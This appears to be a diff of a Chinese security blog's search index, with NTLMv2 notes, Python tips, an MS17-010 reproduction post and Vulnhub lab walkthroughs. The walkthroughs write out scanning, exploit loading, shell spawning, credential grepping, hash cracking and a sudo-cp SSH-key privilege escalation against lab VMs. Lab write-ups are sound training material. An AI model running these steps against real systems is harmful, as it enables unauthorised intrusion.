-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NTLM v2</span></span><br><span class="line"></span><br><span class="line">SC = <span class="number">8</span>-byte server challenge, random</span><br><span class="line">CC = <span class="number">8</span>-byte client challenge, random</span><br><span class="line">CC* = (X, time, CC2, domain name)</span><br><span class="line">v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)</span><br><span class="line">LMv2 = HMAC-MD5(v2-Hash, SC, CC)</span><br><span class="line">NTv2 = HMAC-MD5(v2-Hash, SC, CC*)</span><br><span class="line">response = LMv2 | CC | NTv2 | CC*</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul>
-<li><a href="http://wikipedia.moesalih.com/NTLM" target="_blank" rel="noopener">NT LAN Manager</a></li>
-<li><a href="http://www.voidcn.com/article/p-voxshmho-sn.html" target="_blank" rel="noopener">NTLM 协议</a></li>
-<li><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">Windows下的密码hash——NTLM hash和Net-NTLM hash介绍</a></li>
-</ul>
-]]></content>
-      <tags>
-        <tag>Security</tag>
-        <tag>Windows</tag>
-        <tag>渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -919,9 +919,30 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
 </ul>
 ]]></content>
       <tags>
-        <tag>Security</tag>
         <tag>Windows</tag>
         <tag>渗透测试</tag>
+        <tag>Security</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python不常用用法</title>
+    <url>/2019/09/04/Python%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/</url>
+    <content><![CDATA[<p>Python 日常使用时的一些方法或技巧，怕忘记怕麻烦，记录一下</p>
+<a id="more"></a>
+
+<h2 id="通过值获取键"><a href="#通过值获取键" class="headerlink" title="通过值获取键"></a>通过值获取键</h2><br>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dct = &#123;<span class="string">'Name'</span>: <span class="string">'Alice'</span>, <span class="string">'Age'</span>: <span class="number">18</span>, <span class="string">'uid'</span>: <span class="number">1001</span>, <span class="string">'id'</span>: <span class="number">1001</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">get_key1</span><span class="params">(dct, value)</span>:</span></span><br><span class="line"><span class="meta">... </span>  <span class="keyword">return</span> list(filter(<span class="keyword">lambda</span> k:dct[k] == value, dct))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_key1(dct, <span class="number">1001</span>)</span><br><span class="line">[<span class="string">'id'</span>, <span class="string">'uid'</span>]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 某函数返回的结果（参数 md5dict）</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/76478297_p0.jpg'</span>: <span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/76478297_p0_copy.jpg'</span>: <span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561284.jpg'</span>: <span class="string">'4f9d1c75bd62b0d7e3fdd0abd810ce34'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561271.jpg'</span>: <span class="string">'bb60b6e6626968cde17cad0a8f18290b'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561279.jpg'</span>: <span class="string">'e5af4c3275dafbef5932ab69c446374c'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量 cp的内容</span></span><br><span class="line">(<span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, <span class="number">2</span>)</span><br><span class="line">(<span class="string">'4f9d1c75bd62b0d7e3fdd0abd810ce34'</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">'bb60b6e6626968cde17cad0a8f18290b'</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">'e5af4c3275dafbef5932ab69c446374c'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysedDict</span><span class="params">(md5dict)</span>:</span></span><br><span class="line">    cp = Counter(md5dict.values())  <span class="comment"># 只取 MD5值</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filterFun</span><span class="params">(dicts, value)</span>:</span></span><br><span class="line">        bad = list(filter(<span class="keyword">lambda</span> k:dicts[k] == value, dicts))</span><br><span class="line">        print(bad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.items():</span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">1</span>] &gt; <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">"\033[0;31m&#123;0&#125;\033[0m"</span>.format(i))</span><br><span class="line">            filterFun(md5dict, i[<span class="number">0</span>])</span><br><span class="line">            </span><br><span class="line"><span class="comment"># ---- 结果 ------</span></span><br><span class="line"><span class="comment"># ('6beb7af8d37e26eb88bb1b75c8e51474', 2)</span></span><br><span class="line"><span class="comment"># ['/root/MyDocs/Python/02-PhotosMD5/76478297_p0.jpg', '/root/MyDocs/Python/02-PhotosMD5/76478297_p0_copy.jpg']</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h2 id="快速启动-http服务器"><a href="#快速启动-http服务器" class="headerlink" title="快速启动 http服务器"></a>快速启动 http服务器</h2><br>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -974,200 +995,186 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
       </tags>
   </entry>
   <entry>
-    <title>Python不常用用法</title>
-    <url>/2019/09/04/Python%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/</url>
-    <content><![CDATA[<p>Python 日常使用时的一些方法或技巧，怕忘记怕麻烦，记录一下</p>
+    <title>MS17-010复现</title>
+    <url>/2019/09/13/MS17-010%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>MS17-010/EternalBlue/永恒之蓝</p>
 <a id="more"></a>
 
-<h2 id="通过值获取键"><a href="#通过值获取键" class="headerlink" title="通过值获取键"></a>通过值获取键</h2><br>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dct = &#123;<span class="string">'Name'</span>: <span class="string">'Alice'</span>, <span class="string">'Age'</span>: <span class="number">18</span>, <span class="string">'uid'</span>: <span class="number">1001</span>, <span class="string">'id'</span>: <span class="number">1001</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">get_key1</span><span class="params">(dct, value)</span>:</span></span><br><span class="line"><span class="meta">... </span>  <span class="keyword">return</span> list(filter(<span class="keyword">lambda</span> k:dct[k] == value, dct))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_key1(dct, <span class="number">1001</span>)</span><br><span class="line">[<span class="string">'id'</span>, <span class="string">'uid'</span>]</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 某函数返回的结果（参数 md5dict）</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/76478297_p0.jpg'</span>: <span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/76478297_p0_copy.jpg'</span>: <span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561284.jpg'</span>: <span class="string">'4f9d1c75bd62b0d7e3fdd0abd810ce34'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561271.jpg'</span>: <span class="string">'bb60b6e6626968cde17cad0a8f18290b'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561279.jpg'</span>: <span class="string">'e5af4c3275dafbef5932ab69c446374c'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量 cp的内容</span></span><br><span class="line">(<span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, <span class="number">2</span>)</span><br><span class="line">(<span class="string">'4f9d1c75bd62b0d7e3fdd0abd810ce34'</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">'bb60b6e6626968cde17cad0a8f18290b'</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">'e5af4c3275dafbef5932ab69c446374c'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysedDict</span><span class="params">(md5dict)</span>:</span></span><br><span class="line">    cp = Counter(md5dict.values())  <span class="comment"># 只取 MD5值</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filterFun</span><span class="params">(dicts, value)</span>:</span></span><br><span class="line">        bad = list(filter(<span class="keyword">lambda</span> k:dicts[k] == value, dicts))</span><br><span class="line">        print(bad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.items():</span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">1</span>] &gt; <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">"\033[0;31m&#123;0&#125;\033[0m"</span>.format(i))</span><br><span class="line">            filterFun(md5dict, i[<span class="number">0</span>])</span><br><span class="line">            </span><br><span class="line"><span class="comment"># ---- 结果 ------</span></span><br><span class="line"><span class="comment"># ('6beb7af8d37e26eb88bb1b75c8e51474', 2)</span></span><br><span class="line"><span class="comment"># ['/root/MyDocs/Python/02-PhotosMD5/76478297_p0.jpg', '/root/MyDocs/Python/02-PhotosMD5/76478297_p0_copy.jpg']</span></span><br></pre></td></tr></table></figure>
-
+<p><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010" target="_blank" rel="noopener">Microsoft 安全公告 MS17-010</a></p>
+<p>当 Microsoft 服务器消息块 1.0 (SMBv1)服务器处理某些请求时，存在多个远程执行代码漏洞。<br>成功利用这些漏洞的攻击者可以获取在目标系统上执行代码的能力</p>
+<p>受影响的系统(详细系统版本请查看公告)：</p>
+<ul>
+<li>Windows Vista</li>
+<li>Windows Server 2008</li>
+<li>Windows 7</li>
+<li>Windows Server 2008 R2</li>
+<li>Windows 8.1</li>
+<li>Windows Server 2012 和 Windows Server 2012 R2</li>
+<li>Windows RT 8.1</li>
+<li>Windows 10</li>
+<li>Windows Server 2016</li>
+</ul>
+<p>相对应的 CVE（Windows SMB 远程代码执行漏洞）：</p>
+<ul>
+<li>CVE-2017-0143</li>
+<li>CVE-2017-0144</li>
+<li>CVE-2017-0145</li>
+<li>CVE-2017-0146</li>
+<li>CVE-2017-0148</li>
+</ul>
 <br>
 
-<h2 id="快速启动-http服务器"><a href="#快速启动-http服务器" class="headerlink" title="快速启动 http服务器"></a>快速启动 http服务器</h2><br>
+<p>复现环境：</p>
+<ul>
+<li>Windows 7 (Build 7601, Service Pack 1)</li>
+<li>Ubuntu server(Metasploit)</li>
+</ul>
+<br>
 
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>]]></content>
+<p><img src="./2019-09-13-11-24-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="000" title="搜索漏洞"><br><img src="./2019-09-13-11-10-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="001" title="扫描模块"><br><img src="./2019-09-13-10-41-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="002" title="返回 meterpreter"></p>
+]]></content>
       <tags>
-        <tag>Python</tag>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
-    <title>Five86-1</title>
-    <url>/2020/03/10/Five86-1/</url>
+    <title>Vulnhub靶机——Me and My Girlfirend1</title>
+    <url>/2020/03/03/Me-and-My-Girlfirend1/</url>
     <content><![CDATA[<blockquote>
-<p><code>2020-02-14 14</code> —— <code>2020-02-14 16</code> </p>
+<p>2020-02-10-22</p>
 </blockquote>
 <br>
 
-<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">Description</span><br><span class="line">Five86<span class="number">-1</span> <span class="keyword">is</span> another purposely built vulnerable lab <span class="keyword">with</span> <span class="keyword">the</span> intent <span class="keyword">of</span> gaining experience <span class="keyword">in</span> <span class="keyword">the</span> world <span class="keyword">of</span> penetration testing.</span><br><span class="line"></span><br><span class="line">The ultimate goal <span class="keyword">of</span> this challenge <span class="keyword">is</span> <span class="keyword">to</span> <span class="keyword">get</span> root <span class="keyword">and</span> <span class="keyword">to</span> <span class="built_in">read</span> <span class="keyword">the</span> one <span class="keyword">and</span> only flag.</span><br><span class="line"></span><br><span class="line">Linux skills <span class="keyword">and</span> familiarity <span class="keyword">with</span> <span class="keyword">the</span> Linux command line are a must, <span class="keyword">as</span> <span class="keyword">is</span> <span class="keyword">some</span> experience <span class="keyword">with</span> basic penetration testing tools.</span><br><span class="line"></span><br><span class="line">For beginners, Google can be <span class="keyword">of</span> great assistance, <span class="keyword">but</span> you can always tweet <span class="keyword">me</span> <span class="keyword">at</span> @DCAU7 <span class="keyword">for</span> assistance <span class="keyword">to</span> <span class="keyword">get</span> you going again. But take note: I won't give you <span class="keyword">the</span> answer, instead, I'll give you an idea <span class="keyword">about</span> how <span class="keyword">to</span> move forward.</span><br><span class="line"></span><br><span class="line">Technical Information</span><br><span class="line">Five86<span class="number">-1</span> <span class="keyword">is</span> a VirtualBox VM built <span class="keyword">on</span> Debian <span class="number">64</span> bit, <span class="keyword">but</span> there shouldn't be any issues <span class="built_in">running</span> <span class="keyword">it</span> <span class="keyword">on</span> most PCs.</span><br><span class="line"></span><br><span class="line">Five86<span class="number">-1</span> has been tested successfully <span class="keyword">on</span> VMWare Player, <span class="keyword">but</span> <span class="keyword">if</span> there are any issues <span class="built_in">running</span> this VM <span class="keyword">in</span> VMware, have a <span class="built_in">read</span> <span class="keyword">through</span> <span class="keyword">of</span> this.</span><br><span class="line"></span><br><span class="line">It <span class="keyword">is</span> currently configured <span class="keyword">for</span> Bridged Networking, however, this can be changed <span class="keyword">to</span> suit your requirements. Networking <span class="keyword">is</span> configured <span class="keyword">for</span> DHCP.</span><br><span class="line"></span><br><span class="line">Installation <span class="keyword">is</span> simple - download <span class="keyword">it</span>, unzip <span class="keyword">it</span>, <span class="keyword">and</span> <span class="keyword">then</span> import <span class="keyword">it</span> <span class="keyword">into</span> VirtualBox <span class="keyword">or</span> VMWare <span class="keyword">and</span> away you go.</span><br><span class="line"></span><br><span class="line">Important</span><br><span class="line">While there should be no problems using this VM, <span class="keyword">by</span> downloading <span class="keyword">it</span>, you accept full responsibility <span class="keyword">for</span> any unintentional damage <span class="keyword">that</span> this VM may cause.</span><br><span class="line"></span><br><span class="line">In saying <span class="keyword">that</span>, there shouldn't be any problems, <span class="keyword">but</span> I feel <span class="keyword">the</span> need <span class="keyword">to</span> throw this out there just <span class="keyword">in</span> case.</span><br><span class="line"></span><br><span class="line">Credits</span><br><span class="line">A big thanks goes out <span class="keyword">to</span> <span class="keyword">the</span> members <span class="keyword">of</span> @m0tl3ycr3w.</span><br><span class="line"></span><br><span class="line">Contact</span><br><span class="line">I'm also very interested <span class="keyword">in</span> hearing how people go <span class="keyword">about</span> solving these challenges, so <span class="keyword">if</span> you're up <span class="keyword">for</span> writing a walkthrough, please do so <span class="keyword">and</span> send <span class="keyword">me</span> a link, <span class="keyword">or</span> alternatively, follow <span class="keyword">me</span> <span class="keyword">on</span> Twitter, <span class="keyword">and</span> DM <span class="keyword">me</span> (you can unfollow <span class="keyword">after</span> you've DM'd <span class="keyword">me</span> <span class="keyword">if</span> you'd prefer).</span><br><span class="line"></span><br><span class="line">I can be contacted via Twitter - @Five86_x</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Description: This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, "Ceban Corp", something has changed from Alice's attitude towards Bob like something is "hidden", And Bob asks for your <span class="keyword">help</span> <span class="keyword">to</span> <span class="keyword">get</span> what Alice <span class="keyword">is</span> hiding <span class="keyword">and</span> <span class="keyword">get</span> <span class="keyword">full</span> <span class="keyword">access</span> <span class="keyword">to</span> the company!</span><br><span class="line"></span><br><span class="line">Difficulty <span class="keyword">Level</span>: Beginner</span><br><span class="line"></span><br><span class="line">Notes: there <span class="keyword">are</span> <span class="number">2</span> flag files</span><br><span class="line"></span><br><span class="line">Learning: Web Application | Simple Privilege Escalation</span><br><span class="line"></span><br><span class="line"><span class="keyword">From</span> : https://www.vulnhub.com/entry/me-<span class="keyword">and</span>-my-girlfriend<span class="number">-1</span>,<span class="number">409</span>/</span><br></pre></td></tr></table></figure>
 
 <br>
-<br>
 
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Kali : 192.168.56.109</span><br><span class="line">目标网段 : 192.168.56.1/24</span><br></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">Kali：<span class="number">192.168</span><span class="number">.56</span><span class="number">.109</span></span><br><span class="line"></span><br><span class="line">目标网段：<span class="number">192.168</span><span class="number">.56</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
 
 <br>
 
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br>
 
-<p>主机存活：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -s -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>
-
-<p>扫服务：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -n -Pn -sV -O 192.168.56.114</span><br></pre></td></tr></table></figure>
+<p>显示主机存活扫描：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -n -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>
 
 <br>
 
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">10000/tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br></pre></td></tr></table></figure>
+<p><img src="image-20200210204802372.png" alt="image-20200210204802372"> </p>
+<br>
 
+<p>排除本机与网关后，找出目标机，扫服务/端口：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>访问 <code>80</code> 端口的 Web页面。显示只有 <code>local</code> 地址才能访问，看源代码，作者给出提示：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Maybe you can search how to use x-forwarded-for --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><code>x-forwarded-for</code> ：用来识别通过 HTTP代理或负载均衡方式连接到 Web服务器的客户端<strong>最原始的IP地址</strong>的HTTP请求头字段（就是服务器用来识别客户端原始 IP 地址的）</p>
+<br>
+
+<p>改请求头，添加字段：<code>x-forwarded-for：localhost</code> ，返回页面信息（建议使用 Burp）</p>
+<br>
+
+<p><img src="2020-02-10-18-50-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="postman"> </p>
+<p><img src="2020-02-10-20-58-57%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<hr>
+<p><strong>NOTE</strong> ： 这里犯了一个错误，在查 <code>x-forwarded-for</code> 的时候，偶然看到了 <code>Postman</code> 也就是上图中的软件，下载、使用、测试浪费了许多时间，且最后越来越麻烦（提交表格、登录），最后便放弃了</p>
+<br>
+
+<p>不是说上图的软件不好用或难用，而是对其一点都不熟悉，不懂套路；<code>Burp</code> 使用不熟练 </p>
+<p>在 Burp 上有更方便的操作方式，后来改之</p>
 <br>
 
 <hr>
 <br>
 
-<p>访问 80 端口，无有价值信息</p>
-<p>例行扫目录：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch.py -u http://192.168.56.114 -e php --random-agents</span><br></pre></td></tr></table></figure>
+<p>通过改 <code>x-forwarded-for</code> 值，达到了欺骗服务器并返回数据，页面源代码并无有价值信息</p>
+<br>
+
+<p>既然是 Web 那便开始扫目录：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dirsearch.py -u http://192.168.56.111 -e php --random-agents -t 32</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dirb http://192.168.56.111</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nikto -h http://192.168.56.111</span><br></pre></td></tr></table></figure>
 
 <br>
 
-<p><img src="2020-02-14-14-35-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>经访问：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">########################</span></span><br><span class="line">[14:35:21] 200 -   30B  - /index.html    <span class="comment"># 404</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports          <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports/Webalizer/   <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 200 -   29B  - /robots.txt</span><br><span class="line"><span class="comment">#####</span></span><br><span class="line">http://192.168.56.114/robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /ona</span><br><span class="line"><span class="comment">########################</span></span><br><span class="line">http://192.168.56.114/ona	<span class="comment"># OpenNetAdmin</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-14-14-45-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>搜索相关漏洞，得到远程命令执行：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit opennetadmin</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-02-14-14-44-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<h2 id="海滩登陆"><a href="#海滩登陆" class="headerlink" title="海滩登陆"></a>海滩登陆</h2><br>
-
-<p>使用 <code>47691.sh</code> 如果报错的话，可以先 <code>dos2unix</code> 转换一下格式，作者可能在 <code>dos</code> 环境下写的脚本</p>
-<br>
-
-<p><img src="2020-02-14-18-38-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-<br>
-
-<p>使用 MSF：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先复制到桌面</span></span><br><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/47772.rb ~/Desktop/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到 MSF 内利用</span></span><br><span class="line">cp 47772.rb /usr/share/metasploit-framework/modules/exploits/</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-14-15-10-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
-<br>
-
-<p>测试发现存在 <code>Python</code> 使用交互式 shell</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; shell</span><br><span class="line"></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p>先看 <code>/etc/passwd</code> 有多少用户及有价值信息。目录全无访问权</p>
-<br>
-
-<p><img src="2020-02-14-15-13-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
-<p><img src="2020-02-14-15-13-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>这个时就需要最后的搜刮一下，得到了一组用户密码。其他用户，无有价值信息：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -ri --color=auto --exclude-dir=proc/ <span class="string">'douglas'</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-14-15-28-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
-<p><img src="2020-02-14-15-30-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<hr>
-<br>
-
-<p>Hash 破解，没跑成来，查了一下，会用到作者给的提示 <code>aefhrt</code>。使用 <code>crunch</code> 生产字典：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ crunch 10 10 aefhrt &gt;word.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ crunch 10 10 aefhrt -o word.txt</span><br><span class="line"></span><br><span class="line">$ john --wordlist=word.txt <span class="built_in">hash</span> </span><br><span class="line">$ john --show <span class="built_in">hash</span> </span><br><span class="line"></span><br><span class="line">?:fatherrrrr</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-14-15-51-31%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<h2 id="身份切换-SSH免密登陆"><a href="#身份切换-SSH免密登陆" class="headerlink" title="身份切换(SSH免密登陆)"></a>身份切换(SSH免密登陆)</h2><br>
-
-<p>登录 SSH，得到普通用户，目录下除了 <code>.ssh/</code> 外无其他有价值信息。</p>
-<p>可使用的 <code>sudo</code> 命令为 <code>cp</code> ：</p>
-<br>
-
-<p><img src="2020-02-14-16-03-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>涉及知识的盲区了，特地去查询记录了一下</p>
-<br>
-
-<p><code>cp</code> 命令可以配合  <code>SSH（authorized_keys）</code> 免密登录到其他用户：</p>
-<br>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 为目标生成 ssh key</span></span><br><span class="line">ssh-keygen -b 2048</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制生成的 id_rsa.pub 到 /tmp 下并改名为 authorized_kes</span></span><br><span class="line">cp /home/douglas/.ssh/id_rsa.pub /tmp/authorized_kes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改变 authorized_kes 的权限</span></span><br><span class="line">chmod 777 authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到目标 .ssh/ 下</span></span><br><span class="line">sudo -u jen /bin/cp authorized_keys /home/jen/.ssh/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登陆</span></span><br><span class="line">ssh jen@127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<br>
-
-<p><img src="2020-02-14-16-16-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<p><img src="2020-02-14-16-18-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>说是有邮件，查看邮件，得到另一组用户名和密码，登陆成功。</p>
+<p><img src="2020-02-10-18-46-41%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<p><img src="2020-02-10-18-48-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
 <br>
 
 
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><br>
+<p>得到地址：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/config/</span><br><span class="line">http://192.168.56.111/index.php/login/</span><br><span class="line">http://192.168.56.111/misc/</span><br><span class="line">http://192.168.56.111/robots.txt        <span class="comment">## /heyhoo.txt  </span></span><br><span class="line">http://192.168.56.111/server-status     <span class="comment">## 404</span></span><br><span class="line">http://192.168.56.111/heyhoo.txt        <span class="comment">### null</span></span><br></pre></td></tr></table></figure>
 
-<p>看目录，得到一个 <code>SUID</code> 的二进制文件，可以直接成为 <code>root</code> ，进 <code>root</code> 目录，得到 Flag</p>
-<br>
-<br>
